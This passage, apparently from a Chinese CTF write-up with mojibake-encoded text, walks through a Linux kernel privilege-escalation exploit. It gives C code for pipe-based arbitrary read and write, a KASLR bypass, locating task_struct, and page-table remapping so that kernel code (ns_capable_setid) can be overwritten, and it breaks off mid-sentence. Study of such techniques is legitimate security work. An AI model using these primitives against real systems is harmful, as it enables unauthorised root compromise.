title="å¾ªç¯"><ul><li>é¦–å…ˆéœ€è¦ä¸€ä¸ªæ›´æ”¹pipe1-&gt;pageçš„pipe3</li><li>è¿˜éœ€è¦ä¸€ä¸ªå°†pipe3å¤åŸçš„pipe2</li><li>pipe2è¿˜éœ€è¦å¤åŸï¼ˆåˆåŒå’å•å¾ªç¯äº†(Ë‰â–½Ë‰ï¼›)â€¦ï¼‰ï¼Œç”±äºpipe3å¤„äºé«˜ç‰©ç†åœ°å€å¤„æ‰€ä»¥å¯ä»¥ä¸€å£æ°”å®Œæˆæ›´æ”¹pipe1å’Œpipe2çš„ä»»åŠ¡</li></ul></li><li><p>æ‰€ä»¥å¤§æ¦‚ä¸€ä¸ªè¿‡ç¨‹å°±æ˜¯</p><ul><li>pipe2å¤åŸpipe3</li><li>pipe3æ›´æ”¹pipe1æŒ‡å‘è¦è¯»å†™çš„page</li><li>pipe3å¤åŸpipe2</li></ul></li></ul><h2 id="åœ°å€æ³„éœ²"><a href="#åœ°å€æ³„éœ²" class="headerlink" title="åœ°å€æ³„éœ²"></a>åœ°å€æ³„éœ²</h2><p>éœ€è¦è·å¾—ä¸¤ä¸ªåŸºå€ï¼švmemmapåŸºå€å’ŒkernelåŸºå€</p><ul><li><p>vmemmap</p><ul><li>åœ¨å†…å­˜å¤§äº1Gæ—¶ï¼ŒKASLRçš„ç²’åº¦æ˜¯256MBï¼ˆ0x10000000ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å­˜åœ¨ç‰©ç†åœ°å€physmem_base + 0x9d000ï¼ˆvmemmap[157]ï¼‰å¤„çš„secondary_startup_64å‡½æ•°æŒ‡é’ˆåˆ¤æ–­æ˜¯å¦æ‰¾åˆ°äº†kernelåŸºå€</li><li>ç”±äºæˆ‘ä»¬ä¹‹å‰å·²ç»æœ‰äº†ä¸€ä¸ªpageçš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†è¿™ä¸ªpageçš„åœ°å€256MBå¯¹é½ä½œä¸ºvmemmapåŸºå€ï¼Œå¦‚æœvmemmap[157]å¤„æœ‰secondary_startup_64å‡½æ•°æŒ‡é’ˆåˆ™åŸºå€æ­£ç¡®ï¼Œå¦åˆ™vmemmap-&#x3D;256MBï¼Œç»§ç»­</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> *comm_addr;<br>  <br><span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);<br>setup_evil_pipe();<br>  <br>vmemmap_base = (<span class="hljs-type">size_t</span>) info_pipe_buf.page &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><span class="hljs-keyword">for</span> (;;) &#123;<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + <span class="hljs-number">157</span> * <span class="hljs-number">0x40</span>), buf);<br>  <br>    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0xe0</span>)) &#123;<br>        kernel_base = buf[<span class="hljs-number">0</span>] -  <span class="hljs-number">0xe0</span>;<br>        kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span><br>               <span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, <br>               kernel_base, kernel_offset);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  <br>    vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br></code></pre></td></tr></table></figure><p><em>psï¼šå…³äºkaslrçš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯æ ¹æ®æ³¨é‡Šæ¥çš„ï¼Œä¸æ¸…æ¥šåŸç†ï¼Œæ„Ÿè§‰è¦ç ”ç©¶åŸç†åˆè¦å¼€å§‹ç³»ç»Ÿå¯åŠ¨äº†æ~(ï¿£â–½ï¿£)~*</em></p></li><li><p>current task_struct</p><ul><li><p>task_structç»“æ„ä½“æœ‰ä¸€ä¸ªcommæˆå‘˜ä¼šè®°å½•è¿›ç¨‹çš„åç§°ï¼Œæ˜¯ä¸€ä¸ªåå…­å­—èŠ‚çš„å­—ç¬¦æ•°ç»„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    <span class="hljs-type">char</span>comm[<span class="hljs-number">16</span>];<span class="hljs-comment">/*  2960    16 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>prctlç³»ç»Ÿè°ƒç”¨å¯ä»¥ä¿®æ”¹è¿›ç¨‹çš„åç§°ï¼Œè¿™ä¸ªè¿›ç¨‹åä¹‹åä¼šä½œä¸ºå†…å­˜æœç´¢çš„ç›®æ ‡æ¥å®šä½task_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br>    <br>prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>æœç´¢commï¼Œå¹¶æ ¹æ®commå®šä½task_structï¼Œtask_structçš„ptracedæŒ‡é’ˆæ˜¯æŒ‡å‘è‡ªå·±çš„ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½è·å–task_structçš„åœ°å€</p><p>å› ä¸ºtask_structæ˜¯å­˜åœ¨ç›´æ¥æ˜ å°„åŒºï¼ˆheapï¼‰ä¸Šçš„ï¼Œä¸”åœ¨å†…å­˜å°äº256Mæ—¶heap_base &#x3D; heap_leak &amp; 0xfffffffff0000000ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½è·å¾—ç›´æ¥heapåŸºå€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>), buf);<br><br>    comm_addr = memmem(buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>    <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>        &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>        &amp;&amp; (comm_addr[<span class="hljs-number">-61</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>        &amp;&amp; (comm_addr[<span class="hljs-number">-60</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br>    <br>        <span class="hljs-comment">/* task-&gt;read_parent */</span><br>        parent_task = comm_addr[<span class="hljs-number">-61</span>];<br>    <br>        <span class="hljs-comment">/* task_struct::ptraced */</span><br>        current_task = comm_addr[<span class="hljs-number">-54</span>] - <span class="hljs-number">2528</span>;<br>    <br>        page_offset_base = (comm_addr[<span class="hljs-number">-54</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>        page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br>    <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,<br>               (<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>               page_offset_base);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>               <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ä¸‰ç§ææƒæ–¹æ³•</p><h3 id="USMA"><a href="#USMA" class="headerlink" title="USMA"></a>USMA</h3><p>è€ƒè™‘ç›´æ¥æ›´æ”¹å†…æ ¸ä»£ç æ®µ(â—‹Â´ï½¥Ğ´ï½¥)ï¾‰</p><p>ä½†ç›´æ¥æ˜ å°„åŒºå¯¹åº”çš„ä»£ç æ®µåŒºåŸŸæ²¡æœ‰wæƒé™ï¼Œç›´æ¥å†™å…¥ä¼šé€ æˆkernel panic</p><p>æ”¹å†™ä»£ç æ®µæœ¬è´¨ä¸Šæ˜¯å‘å¯¹åº”çš„ç‰©ç†é¡µå†™å…¥æ•°æ®ï¼Œä¸Šæ–‡æˆ‘ä»¬å·²ç»è·å¾—äº†task_structçš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘æ›´æ”¹è¿›ç¨‹é¡µè¡¨å»ºç«‹ä¸€ä¸ªåˆ°å†…æ ¸ä»£ç æ®µçš„æ˜ å°„ï¼Œè¿™æ ·å°±èƒ½æ”¹å†™äº†ï¼šï¼‰</p><p>æ–¹ä¾¿èµ·è§å…ˆmmapä¸€æ®µåœ°å€ï¼Œå†æ”¹å†™è¿™æ®µåœ°å€çš„é¡µè¡¨ï¼Œè¿™å°±æ˜¯usma \ ^o^ &#x2F;</p><ul><li><p>å…ˆè¯´æ˜ä¸€ä¸‹è¿™ä¸ªåœ°å€è½¬æ¢å‡½æ•°direct_map_addr_to_page_addrï¼Œç”¨äºå°†ç›´æ¥æ˜ å°„åŒºçš„åœ°å€è½¬åŒ–ä¸ºæ‰€å±é¡µçš„pageç»“æ„ä½“åœ°å€ï¼ˆpage_offset_baseæ˜¯ç›´æ¥æ˜ å°„åŒºåŸºå€ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>å…ˆè°ƒç”¨pgd_vaddr_resolveæ‰¾é¡µè¡¨åœ°å€</p><ul><li><p>ä»task_structæ‰€åœ¨é¡µè¯»å–å†…å®¹ï¼ˆè¯»ä¸¤é¡µï¼‰ï¼Œå¹¶è·å–mmå’Œstackçš„åœ°å€ï¼Œå®šä½mm_structæ‰€åœ¨çš„é¡µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading current task_struct...&quot;</span>);<br>    <br><span class="hljs-comment">/* read current task_struct */</span><br>current_task_page = direct_map_addr_to_page_addr(current_task);<br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br>    <br>tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>stack_addr = tsk_buf[<span class="hljs-number">4</span>] + <span class="hljs-number">0x3000</span>;<br>mm_struct_addr = tsk_buf[<span class="hljs-number">292</span>];<br>    <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);<br>    <br>mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);<br>    <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);<br></code></pre></td></tr></table></figure></li><li><p>è¯»mm_structï¼Œå®šä½é¡µè¡¨pgd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* read mm_struct */</span><br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) mm_struct_page, buf);<br>arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (mm_struct_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br>    <br>mm_struct_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (mm_struct_addr &amp; <span class="hljs-number">0xfff</span>));<br>    <br><span class="hljs-comment">/* only this is a virtual addr, others in page table are all physical addr*/</span><br>pgd_addr = mm_struct_buf[<span class="hljs-number">9</span>];<br>    <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span><br>       <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>mmapä¸€æ®µå†…å­˜å¹¶ä¸”å…ˆå¾€é‡Œé¢å†™ç‚¹ä¸œè¥¿ï¼Œå› ä¸ºmmapä¸ä¼šå…ˆåˆ†é…å†…å­˜é¡µï¼Œç¬¬ä¸€æ¬¡å†™å…¥æ‰ä¼šåˆ†é…å†…å­˜é¡µï¼Œéœ€è¦ä¸¤é¡µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810eab50</span><br>  <br><span class="hljs-type">char</span> *kcode_map, *kcode_func;<br><span class="hljs-type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="hljs-number">0</span>;<br>  <br>kcode_map = mmap((<span class="hljs-type">void</span>*) <span class="hljs-number">0x114514000</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, <br>                 MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!kcode_map) &#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to create mmap area!&quot;</span>);<br>&#125;<br>  <br><span class="hljs-comment">/* because of lazy allocation, we need to write it manually */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>    kcode_map[i] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>    kcode_map[i + <span class="hljs-number">0x1000</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>è¦æ›´æ”¹çš„ç›®æ ‡å‡½æ•°æ˜¯ns_capable_setidï¼Œè¿™é‡Œè®¡ç®—çš„æ˜¯è™šæ‹Ÿåœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* overwrite kernel code seg to exec shellcode directly :) */</span><br>dst_vaddr = NS_CAPABLE_SETID + kernel_offset;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,<br>       dst_vaddr);<br></code></pre></td></tr></table></figure></li><li><p>æ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨vaddr_resolve_for_3_levelæŸ¥æ‰¾ns_capable_setidå¯¹åº”çš„é¡µè¡¨é¡¹ï¼Œå› ä¸ºè¿›ç¨‹çš„é¡µè¡¨ä¹Ÿæ˜ å°„äº†å†…æ ¸ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);<br></code></pre></td></tr></table></figure><ul><li><p>å…ˆçœ‹ä¸€äº›ä¸é¡µè¡¨æœ‰å…³çš„å®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_OFFSET 12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_OFFSET 21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_OFFSET 30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_OFFSET 39</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span><br></code></pre></td></tr></table></figure><p>ç”±äºPDEçš„PSä½ç½®ä¸€ï¼Œæ‰€ä»¥PDEç›´æ¥æ˜ å°„åˆ°2Mçš„é¡µï¼Œå…¶å®åªæœ‰ä¸‰çº§é¡µè¡¨ï¼Œæ”¾ä¸€å¼ å››çº§é¡µè¡¨çš„å›¾æ„æ€ä¸€ä¸‹ï¼šï¼‰</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/%E9%A1%B5%E8%A1%A8.png" class title="é¡µè¡¨"></li><li><p>vaddr_resolve_for_3_levelè¿”å›ç›®æ ‡è™šæ‹Ÿåœ°å€çš„ç‰©ç†åœ°å€</p><p>å¯¹äºæ¯çº§é¡µè¡¨</p><ul><li>å…ˆè¯»å–å†…å®¹ï¼Œè¯»ä¸€é¡µ</li><li>æ ¹æ®è™šæ‹Ÿåœ°å€å¯¹åº”ä½æ•°æŸ¥æ‰¾ä¸‹ä¸€çº§é¡µè¡¨çš„åœ°å€ï¼Œè¿˜è¦å»é™¤ä½ä½å’Œé«˜ä½çš„æ ‡å¿—ä½</li><li>ä»¥ä¸Šå¾—å‡ºçš„æ˜¯ç‰©ç†åœ°å€ï¼ŒåŠ ç›´æ¥æ˜ å°„åŒºåŸºå€è½¬åŒ–ä¸ºè™šæ‹Ÿåœ°å€</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">size_t</span> pud_addr, pmd_addr;<br>    <br>arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>pud_addr += page_offset_base;<br>    <br>arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>pmd_addr += page_offset_base;<br>    <br>arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br><span class="hljs-keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>è®¡ç®—ns_capable_setidæ‰€åœ¨çš„å°é¡µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">dst_paddr += <span class="hljs-number">0x1000</span> * PTE_ENTRY(dst_vaddr);<br>  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span><br>       <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨vaddr_remappingæŠŠmmapæ˜ å°„çš„ç‰©ç†åœ°å€æ”¹ä¸ºns_capable_setidï¼Œæ”¹ä¸¤é¡µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remapping to our mmap area */</span><br>vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span>, dst_paddr);<br>vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span> + <span class="hljs-number">0x1000</span>, dst_paddr + <span class="hljs-number">0x1000</span>);<br></code></pre></td></tr></table></figure><ul><li><p>è¿™é‡Œçš„PDEçš„PSä½æ²¡æœ‰ç½®ä¸€ï¼Œæ‰€ä»¥æ˜¯å››çº§é¡µè¡¨ï¼Œæ€è·¯å’Œvaddr_resolve_for_3_levelä¸€æ ·ï¼Œå¤šä¸€æ­¥å¯»è¡¨å’Œæ›´æ”¹ï¼Œæ›´æ”¹å¤„è¿˜è¦å°†é¡µç½®ä¸ºå¯å†™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vaddr_remapping</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr, <span class="hljs-type">size_t</span> paddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    buf[PTE_ENTRY(vaddr)] = paddr | <span class="hljs-number">0x8000000000000867</span>; <span class="hljs-comment">/* mark it writable */</span><br>    arbitrary_write_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,<br>                            <span class="hljs-number">0xff0</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>å¼€å§‹æ›´æ”¹ç›®æ 